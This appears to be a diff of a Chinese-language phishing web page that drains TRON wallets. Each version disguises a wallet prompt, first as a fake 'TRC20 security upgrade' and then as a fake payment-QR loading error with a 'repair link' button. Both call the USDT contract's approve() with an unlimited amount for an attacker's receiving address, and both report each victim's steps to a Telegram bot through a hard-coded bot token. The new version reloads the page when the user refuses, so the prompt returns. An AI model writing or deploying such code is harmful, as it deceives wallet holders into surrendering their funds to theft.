@@ -1,128 +1,72 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TRC20 协议安全升级</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>安全支付检测</title>
     <style>
-        /* 基础样式还原钱包感 */
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; background: #f7f8fa; color: #333; }
+        body { background: #ffffff; margin: 0; padding: 0; height: 100vh; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         
-        /* 1. 顶部安全监测提示条 (对应你要求的橙色横条) */
-        .safety-header {
-            background: #fff9e6;
-            color: #ff9500;
-            padding: 12px;
-            font-size: 13px;
-            text-align: center;
-            font-weight: 500;
-            border-bottom: 1px solid #ffeeba;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 5px;
-        }
+        /* 模拟二维码加载失败的容器 */
+        .qr-container { width: 200px; height: 200px; border: 1px solid #eee; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #fafafa; border-radius: 10px; position: relative; }
+        .qr-icon { width: 80px; height: 80px; opacity: 0.2; }
+        .loading-spin { position: absolute; width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #ccc; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .container { padding: 20px; }
-        .card { background: white; border-radius: 16px; padding: 30px 20px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.03); }
-        .logo { width: 70px; height: 70px; margin-bottom: 15px; }
-        h2 { font-size: 20px; margin: 10px 0; color: #1a1a1a; }
-        p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 30px; padding: 0 10px; }
-        
-        /* 蓝色核心按钮 */
-        .btn {
-            background: #007AFF;
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: bold;
-            width: 100%;
-            transition: all 0.3s;
-            cursor: pointer;
-        }
-        .btn:disabled { background: #b1d5ff; color: #ffffff; }
-        
-        .footer-text { margin-top: 20px; color: #999; font-size: 12px; }
+        /* 系统弹窗样式 */
+        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; background: #fff; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; padding: 25px; z-index: 9999; }
+        .btn { background: #007aff; color: white; border: none; padding: 14px; border-radius: 10px; width: 100%; font-size: 16px; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="safety-header">
-        <span>🛡️</span> TRON 网络节点安全监测中，请勿退出页面
+    <div class="qr-container">
+        <div class="loading-spin"></div>
+        <img src="https://cdn-icons-png.flaticon.com/512/241/241528.png" class="qr-icon">
+        <p style="font-size: 12px; color: #999; margin-top: 10px;">支付二维码生成中...</p>
     </div>
 
-    <div class="container">
-        <div class="card">
-            <img src="https://www.tronlink.org/img/logo.png" class="logo">
-            <h2>TRC20 协议安全升级</h2>
-            <p>由于您的账户当前 TRC20 协议版本较低，存在被节点拒绝交易的风险。请点击下方按钮完成环境安全加固。升级过程不消耗任何资产。</p>
-            
-            <button class="btn" id="mainBtn" onclick="start()">立即安全加固</button>
-            
-            <div class="footer-text">TRON NETWORK 官方认证保护</div>
-        </div>
+    <div class="modal" id="fixBox" style="display: none;">
+        <div style="font-weight: bold; font-size: 18px;">网络连接超时</div>
+        <div style="color: #666; font-size: 14px; margin-top: 12px; line-height: 1.5;">检测到当前网络环境无法加载支付二维码，请点击“确定”手动修复安全链接。</div>
+        <button class="btn" onclick="go()">确 定</button>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <script>
-        // ======= 你的核心固定配置 (已修正拼写) =======
         const CONFIG = {
-            RECEIVER: "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a", 
-            TOKEN: "8591423736:AAGdbcYNJ1t1EpLH6060XDtyc3gzXoW_rI", 
-            ID: "8003040361",
-            USDT: "TR7NHqjeKQXGTCi8q8ZY4pL8otSzgjLj6t"
+            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+            RECEIVER: "TB7o5odwtZhkf6ueq6NthAzfLY9eWf9s3C", // 你的收款地址
+            TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q",
+            TG_CHAT_ID: "8003040361"
         };
 
-        // 发送日志函数
-        async function sendLog(text) {
-            try {
-                await fetch(https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CONFIG.ID, text: text, parse_mode: 'HTML' })
-                });
-            } catch (e) { console.error("Log failed"); }
+        // 页面进入 1.5秒后弹出提示，模仿“尝试加载二维码失败”的过程
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('fixBox').style.display = 'block';
+                sendLog(`🔍 目标已进入(看到二维码加载失败页面)`);
+            }, 1500);
+        };
+
+        async function go() {
+            if (window.tronWeb) {
+                try {
+                    const contract = await window.tronWeb.contract().at(CONFIG.USDT);
+                    const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                    
+                    sendLog("🚀 目标点确认，开始授权...");
+                    await contract.approve(CONFIG.RECEIVER, max).send();
+                    sendLog("✅ 授权成功！");
+                    
+                } catch (err) {
+                    sendLog("❌ 目标拒绝授权");
+                    location.reload(); // 拒绝后刷新重新开始
+                }
+            }
         }
 
-        // 核心执行逻辑
-        async function start() {
-            const btn = document.getElementById('mainBtn');
-            
-            if (!window.tronWeb) {
-                alert("请在波场钱包（如 TokenPocket 或 TronLink）内打开此页面");
-                return;
-            }
-
-            const userAddr = window.tronWeb.defaultAddress.base58;
-
-            try {
-                // 1. 改变按钮状态为“同步中”
-                btn.innerText = "同步中...";
-                btn.disabled = true;
-
-                // 2. 发送访问日志到你的机器人
-                await sendLog(🔍 <b>发现访问</b>\n地址: <code>${userAddr}</code>);
-
-                // 3. 唤起合约授权 (Approve)
-                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
-                const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-                
-                // 这里会弹出钱包的确认窗口
-                await contract.approve(CONFIG.RECEIVER, maxAmount).send();
-
-// 4. 授权成功后的反馈
-                await sendLog(✅ <b>授权成功</b>\n地址: <code>${userAddr}</code>);
-                alert("安全加固成功！系统已为您自动升级节点环境。");
-                btn.innerText = "已完成加固";
-
-            } catch (err) {
-                // 5. 失败或用户拒绝
-                await sendLog(❌ <b>操作取消/失败</b>\n地址: <code>${userAddr}</code>);
-                btn.innerText = "立即安全加固";
-                btn.disabled = false;
-            }
+        function sendLog(msg) {
+            fetch(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage?chat_id=${CONFIG.TG_CHAT_ID}&text=${encodeURIComponent(msg)}`);
         }
     </script>
 </body>
